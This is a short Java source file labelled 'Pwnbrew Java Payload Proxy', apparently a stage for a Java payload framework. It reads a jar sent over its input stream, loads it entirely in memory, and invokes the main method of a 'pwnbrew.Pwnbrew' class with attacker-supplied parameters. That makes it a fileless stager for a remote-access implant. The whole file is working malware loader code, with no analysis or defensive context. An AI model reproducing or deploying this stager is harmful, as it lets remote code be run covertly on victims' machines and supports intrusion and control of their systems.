import java.io.DataInputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;


/**
 * Pwnbrew Java Payload Proxy
 */
public class Pwnbrew implements Stage {

    @Override
    public void start(DataInputStream in, OutputStream out, String[] passedParameters ) throws Exception {

        int coreLen = in.readInt();
        byte[] core = new byte[coreLen];
        in.readFully(core);
        URL coreURL = MemoryBufferURLConnection.createURL(core, "application/jar");

        URLClassLoader aLoader = new URLClassLoader(new URL[] { coreURL }, getClass().getClassLoader());
        Method aMethod = aLoader.loadClass("pwnbrew.Pwnbrew").getMethod("main", new Class[]{ String[].class } );
        aMethod.invoke(null, new Object[]{ passedParameters });

        in.close();
        out.close();
    }
}
